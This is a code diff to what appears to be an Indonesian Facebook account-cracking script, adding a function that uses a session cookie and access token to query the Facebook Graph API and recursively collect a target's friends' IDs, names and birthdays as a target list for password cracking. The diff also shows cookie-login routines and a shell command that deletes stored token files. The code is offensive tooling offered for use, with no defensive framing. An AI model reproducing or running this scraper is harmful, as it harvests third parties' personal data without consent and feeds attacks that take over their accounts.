@@ -451,7 +451,7 @@ def login():
 
 
 
-def logincokkkki():
+def logincoki():
 	asu = random.choice([m,k,h,b,u])
 	cok = Console().input(f" {H2}• {P2}cookie : ")
 	try:
@@ -478,7 +478,7 @@ def logincokkkki():
 
 
 		
-def logincoki():
+def logincokiwww():
 	cookie = Console().input(f" {H2}• {P2}cookie : ")
 	try:
 		ses.headers.update(
@@ -568,6 +568,7 @@ def menu(my_name, my_id):
     try:
         token = open(".vipertok.txt", "r").read()
         cookie = open(".vipercok.txt", "r").read()
+        cok = open(".vipercok.txt", "r").read()
     except IOError:
         Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa tolkon")
         os.system("rm -rf .vipertok.txt && rm -rf .vipercok.txt")
@@ -631,7 +632,9 @@ def menu(my_name, my_id):
     if HaHi in [""]:
         console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! ")
     elif HaHi in ["1", "01"]:
-        dump_publik()
+        idt = input('\n[ ID Target : ')
+        dump(idt,"",{"cookie":cok},token)
+        setting()
     elif HaHi in ["2", "02"]:
         massal()
     elif HaHi in ["3", "03"]:
@@ -683,6 +686,43 @@ def crack_post():
         exit()
     else:
         setting()
+
+
+#----------[ CRACK-PUBLIK  ]----------#            
+def dump(idt,fields,cookie,token):
+	try:
+		headers = {
+			"connection": "keep-alive", 
+			"accept": "*/*", 
+			"sec-fetch-dest": "empty", 
+			"sec-fetch-mode": "cors",
+			"sec-fetch-site": "same-origin", 
+			"sec-fetch-user": "?1",
+			"sec-ch-ua-mobile": "?1",
+			"upgrade-insecure-requests": "1", 
+			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
+			"accept-encoding": "gzip, deflate",
+			"accept-language": "id-ID,id;q=0.9"
+		}
+		if len(id) == 0:
+			params = {
+				"access_token": token,
+				"fields": f"name,friends.fields(id,name,birthday)"
+			}
+		else:
+			params = {
+				"access_token": token,
+				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
+			}
+		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
+		for i in url["friends"]["data"]:
+			#print(i["id"]+"|"+i["name"])
+			id.append(i["id"]+"|"+i["name"])
+			sys.stdout.write(f"\r[ sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
+			sys.stdout.flush()
+		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
+	except:pass
+
 
 
 def dump_publik():
